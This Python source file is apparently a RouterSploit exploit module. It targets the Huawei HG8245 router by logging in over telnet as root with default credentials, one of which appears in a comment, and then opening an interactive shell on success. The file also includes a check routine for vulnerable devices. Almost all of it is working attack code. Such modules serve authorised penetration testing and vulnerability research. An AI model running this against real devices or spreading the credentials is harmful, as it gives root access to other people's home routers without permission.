import telnetlib

from routersploit import (
    exploits,
    print_status,
    print_success,
    print_error,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Huawei HG8245 Default Telnet default root password.
    If the target is vulnerable it is possible to authenticate to the device"
    """
    __info__ = {
        'name': 'Huawei HG8245 Default Telnet root password',
        'description': 'Module exploits Huawei HG8245 default telnet root password. If the target is vulnerable it is possible to authentiate to the device.',
        'authors': [
            'Kaczinski  <kaczinskirmz[at]gmail.com>',  # vulnerability discovery
            'Mohammed CHERIFI <mohammed[at]mcherifi.org>',  # routersploit module
        ],
        'references': [
            'http://websec.ca/advisories/view/Huawei-web-backdoor-and-remote-access',
        ],
        'devices': [
            'Huawei HG8245',
        ]
    }

    target = exploits.Option('192.168.1.1', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)  # target address
    telnet_port = exploits.Option(23, 'Target Telnet port', validators=validators.integer)  # target telnet port

    username = exploits.Option("root", "Username to authenticate with")  # telnet username, default root
    password = exploits.Option("admin", "Password to authenticate with")  # telnet password, default *6P0N4dm1nP4SS*

    def run(self):
        try:
            print_status("Trying to authenticate to the telnet server")
            tn = telnetlib.Telnet(self.target, self.telnet_port)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(self.username + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(self.password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)

            if i != -1:
                print_error("Exploit failed")
            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    print_success("Authentication successful")
                    tn.write("\r\n")
                    tn.interact()
                else:
                    print_error("Exploit failed")

            tn.close()
        except:
            print_error("Connection error {}:{}".format(self.target, self.telnet_port))

    @mute
    def check(self):
        try:
            tn = telnetlib.Telnet(self.target, self.telnet_port)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(self.username + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(self.password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
            tn.close()

            if i != -1:
                return False  # target is not vulnerable
            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    return True  # target is vulnerable
        except:
            return False  # target is not vulnerable

        return False  # target is not vulnerable
